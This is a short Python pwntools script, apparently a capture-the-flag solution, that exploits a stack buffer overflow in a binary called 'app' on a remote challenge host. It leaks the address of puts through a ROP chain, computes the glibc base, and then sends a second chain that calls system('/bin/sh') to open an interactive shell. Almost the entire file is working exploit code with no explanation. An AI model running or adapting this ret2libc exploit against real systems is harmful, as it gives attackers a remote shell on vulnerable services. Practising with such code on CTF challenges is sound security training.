from pwn import *
host_binary_path = "app"
#subprocess.run(["docker", "exec", "-u", "root", "debug_container", "bash", "-c", "pkill -9 gdbserver || true"])

pop_rsp_stuff = 0x00000000004011ed


pop_rdi = 0x00000000004011f3
main_address = 0x401156
puts_in_main_addr = 0x401169
got_puts = 0x404018
plt_puts_stub = 0x401050
puts_relative_offset = 0x0000000000084420
system_relative_offset = 0x0000000000052290
nop_ret = 0x00000000004010cf
ret = 0x000000000040101a
bss = 0x0000000000404038
bss_useful = 0x405000

#p = remote("127.0.0.1", 5050)   # connecting here spawns /app frozen under gdbserver
p = remote("inst-hwykydorn8.tls.vuln.si", 443, ssl=True)   # connecting here spawns /app frozen under gdbserver

#gdb.attach(('127.0.0.1', 9090), exe=host_binary_path, gdbscript='b main')

payload = b'A'*(72) #padding to fill buffer
#payload += p64(bss+0x100) #rbp
payload += p64(pop_rdi) + p64(got_puts) + p64(plt_puts_stub) + p64(nop_ret) + p64(main_address)
p.sendline(payload)
print("Sent payload")
print(p.readline())

addr = p.recv(7)[:-1]
print(addr)
print(len(addr))
puts_addr = u64(addr+b'\x00\x00')
glibc_base = puts_addr-puts_relative_offset
print(f"Found glibc base {hex(glibc_base)}")
#p.sendline(r"/bin/sh\00")


bin_sh_str = 0x1b45bd+glibc_base
system_call = system_relative_offset+glibc_base
print("Running stage 2:")
print(f"{hex(bin_sh_str)} {hex(system_call)}")
payload2  = b'B'*72
payload2 += p64(pop_rdi) + p64(bin_sh_str)+p64(system_call)
p.sendline(payload2)

p.interactive()
